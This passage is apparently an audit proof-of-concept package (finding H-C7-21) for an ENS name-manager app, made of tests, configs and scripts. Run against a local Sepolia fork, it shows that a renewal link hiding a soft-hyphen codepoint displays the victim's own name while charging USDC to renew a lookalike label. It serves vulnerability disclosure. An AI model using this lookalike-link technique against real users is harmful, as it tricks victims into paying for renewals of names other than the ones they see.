  createWalletClient,
  encodeFunctionData,
  http,
  parseAbi,
  type PublicClient,
  type WalletClient,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { describe, expect, it } from 'vitest'
import { normalizeEth2LdName } from '@/features/profile/service/profileName'
import { parseRenewableName } from '@/features/renew/utils/renewableName'

const RPC = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:8945'
const ARM = process.env.POC_ARM === 'control' ? 'control' : 'exploit'
const REAL = process.env.REAL_LABEL ?? 'renewpoc7'
const LOOKALIKE =
  process.env.LOOKALIKE_LABEL ?? (ARM === 'control' ? REAL : 'renew\u00ADpoc7')

const chain = { ...sepolia, rpcUrls: { default: { http: [RPC] } } } as const
const transport = http(RPC)
const pub = createPublicClient({ chain, transport })

// Anvil account 0 — the victim, the connected wallet, and the rent payer.
const VICTIM = privateKeyToAccount(
  '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
)
const wallet = createWalletClient({ account: VICTIM, chain, transport })

const s = ensL1Contracts[supportedL1Chains.sepolia]
const REGISTRAR = s.ensEthRegistrar.address
const REGISTRY = s.ensRegistry.address
const USDC = s.usdc.address
const ERC20 = parseAbi([
  'function approve(address spender, uint256 amount) returns (bool)',
  'function balanceOf(address owner) view returns (uint256)',
])
const YEAR = 365n * 24n * 60n * 60n

const expiryOf = async (label: string): Promise<bigint> =>
  (await ensjsGetExpiry(pub as never, {
    name: `${label}.eth`,
    registryAddress: REGISTRY,
  })) as bigint

const hex = (str: string) =>
  [...str]
    .map((c) =>
      (c.codePointAt(0) ?? 0) > 126
        ? `U+${(c.codePointAt(0) ?? 0).toString(16).toUpperCase().padStart(4, '0')}`
        : c,
    )
    .join('')

describe(`H-C7-21 real submitter, real chain [arm: ${ARM}]`, () => {
  it(
    'the app renews the label it derived, not the name it read the expiry for',
    async () => {
      const param = `${LOOKALIKE}.eth`

      // Derivation B — what the page displays and what the transaction carries.
      const parsed = parseRenewableName(param)
      expect(parsed.isOk()).toBe(true)
      const label = parsed._unsafeUnwrap().label

      // Derivation A — the name whose on-chain state the page showed.
      const expirySource = normalizeEth2LdName(param)
      const expirySourceLabel = (expirySource?.name ?? '').replace(/\.eth$/, '')

      console.log(`  url parameter          = ${hex(param)}`)
      console.log(`  app renews label       = ${hex(label)}   (parseRenewableName)`)
      console.log(`  app read expiry for    = ${hex(expirySource?.name ?? '')}   (normalizeEth2LdName)`)

      const realBefore = await expiryOf(expirySourceLabel)
      const lookBefore = await expiryOf(label)
      const usdcBefore = await pub.readContract({
        address: USDC,
        abi: ERC20,
        functionName: 'balanceOf',
        args: [VICTIM.address],
      })

      // Authorize the registrar, as the app's allowance step does.
      const approveHash = await wallet.sendTransaction({
        account: VICTIM,
        chain,
        to: USDC,
        data: encodeFunctionData({
          abi: ERC20,
          functionName: 'approve',
          args: [REGISTRAR, 10n ** 12n],
        }),
      })
      await pub.waitForTransactionReceipt({ hash: approveHash })

      // THE APP'S OWN SUBMITTER. Real signer, real client, real broadcast.
      const result = await submitRenewActor({
        label,
        duration: YEAR,
        selectedToken: 'USDC',
        signer: { type: 'eoa', walletClient: wallet as WalletClient },
        publicClient: pub as unknown as PublicClient,
        renewerAddress: REGISTRAR,
      })
      expect(result.isOk()).toBe(true)
      const txId = result._unsafeUnwrap()
      await pollTransactionStatusActor({ txId })

      const realAfter = await expiryOf(expirySourceLabel)
      const lookAfter = await expiryOf(label)
      const usdcAfter = await pub.readContract({
        address: USDC,
        abi: ERC20,
        functionName: 'balanceOf',
        args: [VICTIM.address],
      })

      console.log(`  ${hex(expirySourceLabel)}.eth (shown)  ${realBefore} -> ${realAfter}`)
      console.log(`  ${hex(label)}.eth (renewed) ${lookBefore} -> ${lookAfter}`)
      console.log(`MEASURED victim_paid_usdc_units=${usdcBefore - usdcAfter}`)
      console.log(`MEASURED name_on_screen_extended_seconds=${realAfter - realBefore}`)
      console.log(`MEASURED label_renewed_extended_seconds=${lookAfter - lookBefore}`)

      // The label the app derived gained the paid-for term, always.
      expect(lookAfter - lookBefore).toBeGreaterThan(0n)

      if (ARM === 'control') {
        // Plain label: the two derivations agree, so the name on screen IS the one renewed.
        expect(label).toBe(expirySourceLabel)
        expect(realAfter - realBefore).toBeGreaterThan(0n)
      }
      // The exploit arm deliberately asserts NOTHING about the split here. Its claim lives
      // in the measured values, which the manifest checks — and which the declared fix is
      // expected to change. An assertion here would make the patched run fail outright
      // instead of reporting the figures that prove the fix worked.
    },
    180_000,
  )
})
```

#### `vitest.poc.config.ts`

```ts
/// <reference types="vitest" />
//
// H-C7-21 rig config. Identical to apps/manager/vitest.config.ts except for ONE thing:
// it injects VITE_SEPOLIA_RPC_URL into `import.meta.env`.
//
// The app's own config sets `define: { 'import.meta.env': {} }`, which replaces the whole
// object at transform time and silently discards any VITE_* variable passed through the
// environment. Without this, apps/manager/src/lib/wagmi.ts:25 falls back to its default
// PUBLIC Sepolia endpoint and the rig reads the live chain instead of the pinned fork.
//
// This is configuration, not substitution: no application module is replaced, and the
// client the app builds is its own.
import { fileURLToPath } from 'node:url'
import { lingui, linguiTransformerBabelPreset } from '@lingui/vite-plugin'
import babel from '@rolldown/plugin-babel'
import { tanstackStart } from '@tanstack/react-start/plugin/vite'
import viteReact from '@vitejs/plugin-react'
import { defineConfig } from 'vitest/config'

const RPC = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:8945'

export default defineConfig({
  plugins: [
    // The app resolves its RPC through createIsomorphicFn, which is a NO-OP stub unless
    // this plugin transforms it (apps/manager/src/lib/wagmi.ts:38-42). Without the
    // plugin the app ignores VITE_SEPOLIA_RPC_URL entirely and talks to public Sepolia.
    tanstackStart(),
    viteReact(),
    lingui(),
    babel({ presets: [linguiTransformerBabelPreset()] }),
  ],
  test: {
    globals: true,
    environment: 'happy-dom',
  },
  resolve: {
    alias: { '@': fileURLToPath(new URL('./src', import.meta.url)) },
    dedupe: ['@rhinestone/sdk'],
  },
  define: {
    global: 'globalThis',
    // NOTE: the app's own vitest config defines `'process.env': {}`, which rewrites every
    // `process.env.X` to `({}).X` at transform time and silently blanks the rig's inputs.
    // It is deliberately NOT reproduced here.
    'import.meta.env': JSON.stringify({
      VITE_SEPOLIA_RPC_URL: RPC,
      VITE_SEPOLIA_RPC_URL_SERVER: RPC,
    }),
  },
})
```

#### `compose.isolated.yml`

```yaml
# H-C7-21 anvil overlay: host ports, docker network, and the pinned fork block.
#
# Ports and network are moved because this machine already runs other stacks (sei-node-0
# holds 8545; an ens-c5-hca stack holds 4337/3002/3007/8745), so this hunt cannot disturb,
# or be disturbed by, another workspace's chain state.
#
# The anvil service is pinned to a LIVE SEPOLIA FORK at a fixed block. Do NOT add
# docker-compose.snapshot.yml: the ens-v2-snapshot image cannot register names, because the
# registry calls 0x532CD0CC4AC0793d838F71A67d29B2D790D18777, which exists on real Sepolia
# and is absent from that image.
#
# Usage:
#   SEPOLIA_FORK_URL=<sepolia rpc> docker compose -p ens-c7-renew \
#     -f <repo>/e2e/infra/docker-compose.yml \
#     -f compose.isolated.yml up -d anvil
services:
  anvil:
    ports: !override
      - "8945:8545"
    # Pin the fork block so the rig is reproducible. Read-only public RPC used only to
    # populate the fork; no transaction ever reaches Sepolia.
    command: !override
      - --fork-url
      - ${SEPOLIA_FORK_URL}
      - --fork-block-number
      - "11689000"
      - --chain-id
      - "11155111"
      - --port
      - "8545"
      - --host
      - "0.0.0.0"

networks:
  e2e:
    name: ens-c7-renew-net
```

#### `run-browser.sh`

```bash
#!/usr/bin/env bash
# H-C7-21 browser arm: the renewal clicked through in a real browser.
#
# This is the same defect as run.sh proves, driven one layer higher: a real Chromium
# loads the real Manager app, connects a real injected wallet, and clicks the
# application's own renewal flow. The transactions are signed by the wallet and mined by
# a local anvil forked from Sepolia at a pinned block, running the deployed ENS v2
# bytecode. Nothing is mocked.
#
# Prerequisites, both started once:
#
#   1. the fork
#      SEPOLIA_FORK_URL=<sepolia rpc> docker compose -p ens-c7-renew \
#        -f repos/audit-comp-ens/e2e/infra/docker-compose.yml \
#        -f verification/pocs/H-C7-21/compose.isolated.yml up -d anvil
#
#   2. the application, pointed at that fork
#      cd repos/audit-comp-ens/apps/manager
#      VITE_SEPOLIA_RPC_URL=http://127.0.0.1:8945 pnpm dev
#
# Usage: run-browser.sh [exploit|control]
set -euo pipefail

ARM="${1:-exploit}"
case "$ARM" in exploit|control) ;; *) echo "FATAL: arm must be exploit|control, got '$ARM'" >&2; exit 1;; esac

HERE="$(cd -P "$(dirname "$0")" && pwd)"
ROOT="$HERE/../../../repos/audit-comp-ens"
E2E="$ROOT/e2e"
RPC="${ANVIL_RPC_URL:-http://127.0.0.1:8945}"
APP="${MANAGER_APP_URL:-http://localhost:3000}"

[ -d "$E2E" ] || { echo "FATAL: e2e package not found at $E2E" >&2; exit 1; }

if ! curl -s -m 5 -X POST -H 'content-type: application/json' \
      --data '{"jsonrpc":"2.0","id":1,"method":"eth_chainId","params":[]}' "$RPC" >/dev/null; then
  echo "FATAL: no anvil at $RPC. Start the fork first, see the header of this file." >&2
  exit 1
fi
if ! curl -s -m 10 -o /dev/null "$APP"; then
  echo "FATAL: no Manager app at $APP. Start it against the fork, see the header." >&2
  exit 1
fi

export REAL_LABEL="${REAL_LABEL:-renewpoc7}"
if [ "$ARM" = "control" ]; then
  export LOOKALIKE_LABEL="$REAL_LABEL"
else
  export LOOKALIKE_LABEL="$(printf 'renew\xc2\xadpoc7')"
fi
export ANVIL_RPC_URL="$RPC"
export MANAGER_APP_URL="$APP"
export POC_ARM="$ARM"

SPEC="$E2E/projects/manager/tests/h-c7-21-browser.spec.ts"
CFG="$E2E/h-c7-21-playwright.config.ts"
CHAIN="$E2E/h-c7-21-chain.ts"
cleanup() { rm -f "$SPEC" "$CFG" "$CHAIN"; }
trap cleanup EXIT

echo "=== seeding the chain ==="
cp "$HERE/chain.ts" "$CHAIN"
( cd "$E2E" && MODE=setup pnpm exec tsx h-c7-21-chain.ts )

echo
echo "=== clicking the renewal through a real browser ==="
cp "$HERE/browser.spec.ts" "$SPEC"
cp "$HERE/playwright.poc.config.ts" "$CFG"
( cd "$E2E" && pnpm exec playwright test --config=h-c7-21-playwright.config.ts )
```

#### `browser.spec.ts`

```ts
/**
 * H-C7-21 browser arm: the whole flow, clicked in a real browser, with no mocks.
 *
 *   real Chromium  ->  real Manager app (vite dev server, pointed at the fork)
 *   real injected wallet (the repository's own headless web3 provider fixture)
 *   real anvil forked from Sepolia at a pinned block, real deployed ENS v2 bytecode
 *   real transactions, signed through the wallet and mined
 *
 * The victim opens a URL whose label carries one codepoint that ENSIP-15 deletes and
 * String.prototype.toLowerCase() keeps. The page shows the victim's own name. The victim
 * then clicks through the application's own renewal flow and pays.
 *
 * Afterwards the chain says which registration actually moved.
 *
 * `connectedPage` is used rather than `profileConnectedPage` because the latter waits for
 * a PostHog feature-flag override, and PostHog does not load on a dev server without a
 * project key. The flags gate unrelated profile UI; the renewal route does not need them.
 */
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import { getExpiry as ensjsGetExpiry } from '@ensdomains/ensjs/public/v2'
import {
  authorizeTransactionsWhile,
  expect,
  test,
} from '../../../fixtures/playwright.manager.fixture.js'
import { publicClient } from '../../../helpers/anvil-client.js'
import { renewFor28Days } from '../../../helpers/profile-helpers.js'

const APP = process.env.MANAGER_APP_URL ?? 'http://localhost:3000'
const ARM = process.env.POC_ARM === 'control' ? 'control' : 'exploit'
const REAL = process.env.REAL_LABEL ?? 'renewpoc7'
// Control opens the plain label, exploit the one carrying U+00AD. Same flow either way.
const LOOKALIKE =
  process.env.LOOKALIKE_LABEL ?? (ARM === 'control' ? 'renewpoc7' : 'renew\u00ADpoc7')
const REGISTRY = ensL1Contracts[supportedL1Chains.sepolia].ensRegistry.address

const expiryOf = async (label: string): Promise<bigint> =>
  (await ensjsGetExpiry(publicClient as never, {
    name: `${label}.eth`,
    registryAddress: REGISTRY,
  })) as bigint

const hex = (s: string) =>
  [...s]
    .map((c) =>
      (c.codePointAt(0) ?? 0) > 126
        ? `U+${(c.codePointAt(0) ?? 0).toString(16).toUpperCase().padStart(4, '0')}`
        : c,
    )
    .join('')

test.describe(`H-C7-21 renewal two-node split [arm: ${ARM}]`, () => {
  test.describe.configure({ timeout: 600_000 })

  test('renewing the name on screen extends a different registration', async ({
    connectedPage: page,
    wallet,
  }) => {
    const realBefore = await expiryOf(REAL)
    const lookBefore = await expiryOf(LOOKALIKE)
    console.log(`MEASURED name_on_screen_expiry_before=${realBefore}`)
    console.log(`MEASURED label_renewed_expiry_before=${lookBefore}`)

    // The victim opens the attacker's link. %C2%AD is the soft hyphen.
    await page.goto(`${APP}/renew/${encodeURIComponent(`${LOOKALIKE}.eth`)}`)
    await page.waitForLoadState('networkidle')

    const heading = (await page.getByRole('heading').first().textContent()) ?? ''
    const stripped = heading.replace(/­/g, '')
    console.log(`  heading rendered by the app = ${hex(heading)}`)
    console.log(`  heading without invisibles  = ${hex(stripped)}`)
    console.log(`MEASURED heading_reads_as_victims_own_name=${stripped.includes(`${REAL}.eth`) ? 1 : 0}`)
    expect(stripped).toContain(`${REAL}.eth`)

    // EOA mode sends two transactions: the USDC approve, then the renew. Authorize
    // each as the wallet queues it, and stop as soon as the flow reports completion.
    let done = false
    const authorizing = authorizeTransactionsWhile(page, wallet, () => done)

    try {
      await renewFor28Days(page)
    } finally {
      done = true
      await authorizing.catch(() => {})
    }

    const realAfter = await expiryOf(REAL)
    const lookAfter = await expiryOf(LOOKALIKE)

    console.log(`MEASURED name_on_screen_extended_seconds=${realAfter - realBefore}`)
    console.log(`MEASURED label_renewed_extended_seconds=${lookAfter - lookBefore}`)

    // The label the flow renewed always gains the paid term.
    expect(lookAfter - lookBefore).toBeGreaterThan(0n)

    if (ARM === 'control') {
      // Plain label: the two derivations agree, so the name on screen is the one renewed.
      expect(LOOKALIKE).toBe(REAL)
      expect(realAfter - realBefore).toBeGreaterThan(0n)
    } else {
      // One invisible codepoint: the name on screen gained nothing.
      expect(LOOKALIKE).not.toBe(REAL)
      expect(realAfter - realBefore).toBe(0n)
    }
  })
})
```

#### `playwright.poc.config.ts`

```ts
// H-C7-21 browser-arm config. Identical to the repo's manager config except for the
// test directory and a longer timeout, because this flow sends several on-chain
// transactions.
//
// Nothing about the application or the chain is changed by this file.
import { defineConfig } from '@playwright/test'
import { baseConfig } from '../../../repos/audit-comp-ens/e2e/playwright.config.base.js'

export default defineConfig({
  ...baseConfig,
  timeout: 600_000,
  testDir: '../../../repos/audit-comp-ens/e2e/projects/manager/tests',
  use: {
    ...baseConfig.use,
    baseURL: process.env.MANAGER_APP_URL ?? 'http://localhost:3000',
  },
  projects: [
    {
      name: 'h-c7-21',
      testMatch: /h-c7-21-browser\.spec\.ts$/,
    },
  ],
})
```
